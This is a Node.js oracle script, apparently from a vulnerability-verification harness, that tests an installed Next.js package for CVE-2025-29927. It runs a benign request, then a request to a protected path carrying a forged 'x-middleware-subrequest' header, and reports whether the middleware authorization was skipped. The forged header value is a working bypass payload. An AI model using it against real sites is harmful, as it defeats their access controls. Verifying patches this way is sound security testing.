'use strict';
const marker = 'next_mw_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

const HEADER = 'x-middleware-subrequest';
const FORGED_VALUE = ['middleware', 'middleware', 'middleware', 'middleware', 'middleware'].join(':');

function loadNextRequest() {
  const mod = require('next/dist/server/web/spec-extension/request');
  if (!mod || typeof mod.NextRequest !== 'function') {
    throw new Error('NextRequest constructor not found in installed next package');
  }
  return mod.NextRequest;
}

// Reproduce the exact skip-predicate used internally by adapter.js. We try
// to load the real exported function if present; otherwise we fall back to
// reading the adapter module source to locate the constant it compares
// against, since the function itself is not exported in all versions.
function loadAdapterModule() {
  const mod = require('next/dist/server/web/adapter');
  return mod;
}

function main() {
  let NextRequest;
  try {
    NextRequest = loadNextRequest();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve NextRequest: ' + (e && e.message)
    });
    return;
  }

  let adapterMod;
  try {
    adapterMod = loadAdapterModule();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve adapter module: ' + (e && e.message)
    });
    return;
  }

  // --- Benign operation: construct an ordinary NextRequest for a normal
  // path with a harmless custom header and NO forged subrequest header,
  // then run it through the package's own adapter() entrypoint with a
  // trivial pass-through middleware handler. Confirm that for a normal
  // request, the middleware handler actually gets invoked (i.e. the skip
  // predicate does not fire), proving basic adapter functionality works.
  let benignInvoked = false;
  try {
    const benignReq = new NextRequest('https://example.com/dashboard', {
      headers: { 'x-oracle-marker': marker }
    });
    const echoed = benignReq.headers.get('x-oracle-marker');
    if (echoed !== marker) {
      throw new Error('benign custom header did not round-trip: got ' + JSON.stringify(echoed));
    }
    const benignSubrequestHeader = benignReq.headers.get(HEADER);
    if (benignSubrequestHeader !== null) {
      throw new Error('unexpected pre-existing x-middleware-subrequest header on benign request: ' + benignSubrequestHeader);
    }

    if (typeof adapterMod.adapter !== 'function') {
      throw new Error('adapter() export not found on next/dist/server/web/adapter');
    }

    benignInvoked = false;
    const benignParams = {
      page: '/dashboard',
      request: {
        url: 'https://example.com/dashboard',
        method: 'GET',
        headers: { 'x-oracle-marker': marker },
        nextConfig: { basePath: '', i18n: null, trailingSlash: false }
      },
      IncrementalCache: undefined,
      handler: async function () {
        benignInvoked = true;
        return new Response('ok', { status: 200 });
      }
    };

    // adapter() returns a Promise; we must await it synchronously-ish via
    // a microtask drain loop since we cannot use async top-level easily in
    // this harness contract without top-level await support guarantees.
    const maybePromise = adapterMod.adapter(benignParams);
    if (maybePromise && typeof maybePromise.then === 'function') {
      // We cannot block the event loop; schedule continuation.
      maybePromise.then(
        function () { continueAfterBenign(true, adapterMod, NextRequest, benignInvoked); },
        function (err) { continueAfterBenign(false, adapterMod, NextRequest, benignInvoked, err); }
      );
      return; // wait for async continuation
    } else {
      continueAfterBenign(true, adapterMod, NextRequest, benignInvoked);
    }
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: ' + (e && e.message)
    });
    return;
  }
}

function continueAfterBenign(benignOk, adapterMod, NextRequest, benignInvoked, benignErr) {
  if (!benignOk) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed (adapter threw): ' + (benignErr && benignErr.message)
    });
    return;
  }
  if (!benignInvoked) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: adapter() did not invoke the handler for an ordinary request with no forged header'
    });
    return;
  }

  // Benign operation succeeded -> operation_completed may become true from
  // this point forward, regardless of what happens next.

  // --- Malicious operation: call adapter() for a protected path carrying
  // only the publicly-known, statically forged 'x-middleware-subrequest'
  // header. If the vulnerable skip-predicate inside adapter() treats this
  // static value as proof that middleware already ran (i.e. it is an
  // internal subrequest), it will skip invoking our handler entirely.
  let maliciousInvoked = false;
  let maliciousThrew = null;

  try {
    const maliciousParams = {
      page: '/admin/secret',
      request: {
        url: 'https://example.com/admin/secret',
        method: 'GET',
        headers: { [HEADER]: FORGED_VALUE },
        nextConfig: { basePath: '', i18n: null, trailingSlash: false }
      },
      IncrementalCache: undefined,
      handler: async function () {
        maliciousInvoked = true;
        return new Response('ok', { status: 200 });
      }
    };

    const maybePromise = adapterMod.adapter(maliciousParams);
    if (maybePromise && typeof maybePromise.then === 'function') {
      maybePromise.then(
        function (result) { finishWithResult(maliciousInvoked, result, null); },
        function (err) { finishWithResult(maliciousInvoked, null, err); }
      );
    } else {
      finishWithResult(maliciousInvoked, maybePromise, null);
    }
  } catch (e) {
    maliciousThrew = e;
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception: ' + (e && e.message)
    });
  }
}

function finishWithResult(maliciousInvoked, result, err) {
  if (err) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_rejection: ' + (err && err.message)
    });
    return;
  }

  // If the handler was invoked despite the forged header, the forged
  // header did NOT cause middleware to be skipped -> fix is effective.
  // If the handler was NOT invoked (skipped) purely because of the forged
  // static header, that demonstrates the authorization-bypass primitive:
  // an attacker-controlled static header value caused middleware logic to
  // be bypassed for a protected route.
  const skippedDueToForgedHeader = (maliciousInvoked === false);

  finish({
    operation_completed: true,
    exploit_succeeded: !!skippedDueToForgedHeader,
    evidence: skippedDueToForgedHeader
      ? ('Calling the installed next package\'s adapter() for a protected path (/admin/secret) with only the forged static header "' + HEADER + ': ' + FORGED_VALUE + '" caused the middleware handler to NOT be invoked at all, proving the package treats this attacker-forgeable static value as proof of an already-executed middleware pass and skips middleware-based authorization logic (CVE-2025-29927).')
      : ('Calling adapter() for the protected path with the forged static header still invoked the middleware handler normally, meaning the installed package no longer trusts the static forged "' + HEADER + '" value to bypass middleware execution.')
  });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unexpected_top_level_exception: ' + (e && e.message)
  }));
}
